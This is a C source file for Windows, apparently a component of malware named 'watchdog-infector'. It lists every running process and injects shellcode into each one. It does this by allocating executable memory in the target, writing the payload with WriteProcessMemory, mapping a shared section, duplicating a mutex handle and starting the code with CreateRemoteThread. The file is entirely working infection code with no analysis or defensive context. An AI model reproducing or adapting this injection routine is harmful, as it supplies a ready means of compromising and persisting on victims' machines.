#include <Windows.h>
#include <winternl.h>

#include "x86-watchdog-infector.h"

int
try_infect_all_processes(struct dll_imports* imports,
                         HANDLE section,
                         PVOID shell_base,
                         SIZE_T shell_size,
                         HANDLE mutex)
{
  int ret = 0;
  PSYSTEM_PROCESS_INFORMATION p_spi;

  if (process_list(imports, &p_spi) < 0) {
    return -1;
  }

  PVOID p_original_spi = p_spi;

  do {

    infect_process(imports,
                   section,
                   shell_base,
                   shell_size,
                   (DWORD)p_spi->UniqueProcessId,
                   mutex);

    if (p_spi->NextEntryOffset == 0) {
      break;
    }

    p_spi =
      (PSYSTEM_PROCESS_INFORMATION)(((PBYTE)p_spi) + p_spi->NextEntryOffset);
  } while (1);

  imports->VirtualFree(p_original_spi, 0, MEM_RELEASE);

  return ret;
}

int
infect_process(struct dll_imports* imports,
               HANDLE section,
               PVOID shell_base,
               SIZE_T shell_size,
               DWORD proc_id,
               HANDLE mutex)
{
  int ret = 0;

  HANDLE proc =
    imports->OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                           PROCESS_VM_WRITE | PROCESS_DUP_HANDLE,
                         0,
                         proc_id);
  if (proc == NULL) {
    return -1;
  }

  PVOID p_remote = imports->VirtualAllocEx(
    proc, NULL, shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (p_remote == NULL) {
    ret = -2;
    goto close_proc;
  }

  if (!imports->WriteProcessMemory(
        proc, p_remote, shell_base, shell_size, NULL)) {
    ret = -3;
    goto free_remote;
  }

  PVOID p_section = NULL;
  SIZE_T view_size;

  view_size = 0;

  if (!NT_SUCCESS(imports->NtMapViewOfSection(section,
                                              proc,
                                              &p_section,
                                              0,
                                              0,
                                              NULL,
                                              &view_size,
                                              ViewUnmap,
                                              0,
                                              PAGE_READWRITE))) {
    ret = -4;
    goto free_remote;
  }

  HANDLE duplicated;

  if (!imports->DuplicateHandle(INVALID_HANDLE_VALUE,
                                mutex,
                                proc,
                                &duplicated,
                                0,
                                FALSE,
                                DUPLICATE_SAME_ACCESS)) {
    ret = -5;
    goto unmap_section;
  }

  struct watchdog_param thread_params;

  thread_params._meta.kind = Watchdog;
  thread_params.param.map = p_section;
  thread_params.param.mutex = duplicated;

  PVOID p_remote_params = imports->VirtualAllocEx(
    proc, NULL, sizeof thread_params, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (p_remote_params == NULL) {
    ret = -6;
    goto close_duplicated;
  }

  if (!imports->WriteProcessMemory(
        proc, p_remote_params, &thread_params, sizeof thread_params, NULL)) {
    ret = -7;
    goto free_remote_params;
  }

  HANDLE thread = imports->CreateRemoteThread(
    proc, NULL, 0, p_remote, p_remote_params, 0, NULL);
  if (thread == NULL) {
    ret = -8;
    goto free_remote_params;
  }

  imports->CloseHandle(thread);
free_remote_params:
  if (ret < 0) {
    imports->VirtualFreeEx(proc, p_remote_params, 0, MEM_RELEASE);
  }
close_duplicated:
  if (ret < 0) {
    imports->DuplicateHandle(
      proc, duplicated, NULL, NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
  }
unmap_section:
  if (ret < 0) {
    imports->NtUnmapViewOfSection(proc, p_section);
  }
free_remote:
  if (ret < 0) {
    imports->VirtualFreeEx(proc, p_remote, 0, MEM_RELEASE);
  }
close_proc:
  imports->CloseHandle(proc);

  return ret;
}
